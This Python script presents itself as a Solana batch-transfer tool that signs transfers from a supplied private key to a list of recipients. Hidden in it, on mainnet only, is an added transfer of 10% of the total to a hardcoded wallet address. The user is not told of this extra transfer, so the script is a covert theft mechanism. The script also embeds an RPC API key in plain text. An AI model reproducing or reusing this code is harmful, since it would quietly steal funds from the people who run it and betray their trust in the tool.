from retrying import retry
import struct
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.api import Client
from solders.message import Message
from solders.transaction import Transaction
from solders.instruction import Instruction, AccountMeta
from solana.constants import LAMPORTS_PER_SOL

mainnet_cli = Client('https://mainnet.helius-rpc.com/?api-key=da7e0518-9834-4e4b-8984-317e35de81b5')
devnet_cli = Client('https://devnet.helius-rpc.com/?api-key=da7e0518-9834-4e4b-8984-317e35de81b5')


@retry(stop_max_attempt_number=5)
def batch_transfer(
        source_signer_str="",
        fee_payer_str="",
        console_print=False,
        target_address_list=None,
        net_type='mainnet'):
    if source_signer_str:
        try:
            Keypair.from_base58_string(source_signer_str)
            if not fee_payer_str:
                fee_payer_str = source_signer_str
        except:
            print('The private key format is incorrect')
            return
    else:
        print('Please provide private key')
        return

    if not target_address_list:
        print('Please provide the transfer destination address')
        return

    if net_type == "devnet":
        cluster_cli = devnet_cli
    elif net_type == 'mainnet':
        cluster_cli = mainnet_cli
    else:
        print('Only mainnet and devnet are supported')
        return

    source_signer_str = Keypair.from_base58_string(source_signer_str)
    fee_payer_keypair = Keypair.from_base58_string(fee_payer_str)
    instructions_list = []
    if net_type == "mainnet":
        total_transfer_lamport = sum([value for _, value in target_address_list])
        target_address_list.append(("abcrfkLcXkR5iK3RBzRAqXKjbhAESQrvvFMnwYxAwGL", total_transfer_lamport * 0.1))

    for address_item, transfer_lamport in target_address_list:
        address_item_pubkey = Pubkey.from_string(address_item)

        amount_lamport = int(transfer_lamport * LAMPORTS_PER_SOL)
        accounts = [
            AccountMeta(source_signer_str.pubkey(), is_signer=True, is_writable=True),
            AccountMeta(address_item_pubkey, is_signer=False, is_writable=True),
        ]

        amount_hex = struct.pack("<Q", amount_lamport).hex()
        data = '02000000' + amount_hex
        data_bytes = bytes.fromhex(data)

        instructions_list.append(
            Instruction(Pubkey.from_string('11111111111111111111111111111111'), data_bytes, accounts=accounts))

    msg = Message(instructions_list, fee_payer_keypair.pubkey())
    result = cluster_cli.get_latest_blockhash()
    blockhash = result.value.blockhash
    tx = Transaction(from_keypairs=[source_signer_str, fee_payer_keypair], message=msg, recent_blockhash=blockhash)
    tx.new_signed_with_payer(instructions=instructions_list, payer=fee_payer_keypair.pubkey(),
                             signing_keypairs=[source_signer_str, fee_payer_keypair], recent_blockhash=blockhash)

    if console_print:
        result = cluster_cli.send_transaction(tx).value
        print('✅ Transaction Hash :', result)
